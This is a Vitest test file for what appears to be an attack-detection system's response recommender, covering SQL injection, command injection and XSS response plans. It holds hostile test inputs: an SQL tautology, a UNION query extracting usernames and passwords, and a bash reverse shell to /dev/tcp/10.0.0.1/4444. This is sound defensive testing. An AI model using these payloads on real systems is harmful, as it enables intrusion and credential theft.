import { describe, it, expect } from 'vitest'
import { generateResponsePlan } from './response-recommender.js'
import { simulateSqlEffect, simulateCmdEffect, fingerprintAdversary } from './effect-simulator.js'
import { UnifiedRuntime } from '../unified-runtime.js'

describe('Response Recommender', () => {

    describe('SQL injection response plan', () => {
        it('generates containment + remediation for SQL injection', () => {
            const effect = simulateSqlEffect("' OR 1=1--")
            const plan = generateResponsePlan(
                [{ class: 'sql_tautology', confidence: 0.95, category: 'sql', severity: 'high', isNovelVariant: false, description: 'SQL tautology' }],
                effect,
                null,
                [],
                { method: 'POST', path: '/api/login', sourceHash: 'src_123' },
            )

            expect(plan.severity).toBe('high')
            expect(plan.recommendations.length).toBeGreaterThanOrEqual(3)
            // Must have containment actions
            expect(plan.recommendations.some(r => r.category === 'contain')).toBe(true)
            // Must have remediation
            expect(plan.recommendations.some(r => r.category === 'remediate')).toBe(true)
            // SQL-specific remediation should mention parameterized queries
            const sqlFix = plan.recommendations.find(r => r.id === 'remediate_sql_parameterize')
            expect(sqlFix).toBeDefined()
            expect(sqlFix!.steps!.some(s => s.includes('parameterized'))).toBe(true)
        })

        it('recommends credential rotation for credential theft', () => {
            const effect = simulateSqlEffect("' UNION SELECT username,password FROM users--")
            const plan = generateResponsePlan(
                [{ class: 'sql_union_extraction', confidence: 0.95, category: 'sql', severity: 'high', isNovelVariant: false, description: 'UNION extraction' }],
                effect,
                null,
                [],
                { method: 'POST', path: '/api/search', sourceHash: 'src_456' },
            )

            const credRotation = plan.recommendations.find(r => r.id === 'contain_rotate_creds')
            expect(credRotation).toBeDefined()
            expect(credRotation!.urgency).toBe('immediate')
        })
    })

    describe('Command injection response plan', () => {
        it('generates process audit for command injection', () => {
            const effect = simulateCmdEffect("/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
            const plan = generateResponsePlan(
                [{ class: 'cmd_separator', confidence: 0.95, category: 'cmdi', severity: 'critical', isNovelVariant: false, description: 'Command injection' }],
                effect,
                null,
                [],
                { method: 'POST', path: '/api/ping', sourceHash: 'src_cmd' },
            )

            expect(plan.severity).toBe('critical')
            expect(plan.requiresHuman).toBe(true)
            const cmdAudit = plan.recommendations.find(r => r.id === 'contain_cmd_audit')
            expect(cmdAudit).toBeDefined()
            expect(cmdAudit!.steps!.some(s => s.includes('netstat'))).toBe(true)
        })
    })

    describe('XSS response plan', () => {
        it('recommends CSP for XSS', () => {
            const plan = generateResponsePlan(
                [{ class: 'xss_tag_injection', confidence: 0.90, category: 'xss', severity: 'high', isNovelVariant: false, description: 'XSS tag injection' }],
                null,
                null,
                [],
                { method: 'POST', path: '/api/comment', sourceHash: 'src_xss' },
            )

            const csp = plan.recommendations.find(r => r.id === 'contain_xss_csp')
            expect(csp).toBeDefined()
            expect(csp!.steps!.some(s => s.includes('Content-Security-Policy'))).toBe(true)
        })
    })

    describe('Automated tool detection escalation', () => {
        it('includes tool investigation for automated attacks', () => {
            const fp = fingerprintAdversary("' AND 5743=5743--+", ['sql_tautology'])
            const plan = generateResponsePlan(
                [{ class: 'sql_tautology', confidence: 0.90, category: 'sql', severity: 'high', isNovelVariant: false, description: 'SQL tautology' }],
                null,
                fp,
                [],
                { method: 'POST', path: '/api/login', sourceHash: 'src_sqlmap' },
            )

            const toolInvestigation = plan.recommendations.find(r => r.id === 'investigate_tool_campaign')
            expect(toolInvestigation).toBeDefined()
            expect(toolInvestigation!.action).toContain('sqlmap')
        })
    })

    describe('Ordering and deduplication', () => {
        it('orders recommendations by urgency then category', () => {
            const plan = generateResponsePlan(
                [
                    { class: 'sql_tautology', confidence: 0.95, category: 'sql', severity: 'high', isNovelVariant: false, description: '' },
                    { class: 'xss_tag_injection', confidence: 0.90, category: 'xss', severity: 'high', isNovelVariant: false, description: '' },
                ],
                null,
                null,
                [],
                { method: 'POST', path: '/api', sourceHash: 'src' },
            )

            // First should be immediate/contain
            const first = plan.recommendations[0]
            expect(first.urgency).toBe('immediate')
            expect(first.category).toBe('contain')

            // Hardening should come last
            const last = plan.recommendations[plan.recommendations.length - 1]
            expect(last.category).toBe('harden')
        })
    })

    describe('Pipeline integration', () => {
        it('response plan populated in UnifiedRuntime output', () => {
            const runtime = new UnifiedRuntime()
            const result = runtime.processSync({
                input: "' OR 1=1--",
                sourceHash: 'src_plan_test',
                request: { method: 'POST', path: '/api/login' },
            })

            expect(result.responsePlan).not.toBeNull()
            expect(result.responsePlan!.recommendations.length).toBeGreaterThanOrEqual(3)
            expect(result.responsePlan!.summary).toContain('sql')
        })

        it('clean input has null response plan', () => {
            const runtime = new UnifiedRuntime()
            const result = runtime.processSync({
                input: 'hello world',
                sourceHash: 'src_clean_plan',
                request: { method: 'GET', path: '/api' },
            })

            expect(result.responsePlan).toBeNull()
        })

        it('response plan includes effect simulation data when available', () => {
            const runtime = new UnifiedRuntime()
            const result = runtime.processSync({
                input: "' UNION SELECT username,password FROM users--",
                sourceHash: 'src_union_plan',
                request: { method: 'POST', path: '/api/search' },
            })

            expect(result.responsePlan).not.toBeNull()
            // Should have credential rotation recommendation because effect is steal_credentials
            const credRotation = result.responsePlan!.recommendations.find(r => r.id === 'contain_rotate_creds')
            expect(credRotation).toBeDefined()
        })
    })
})
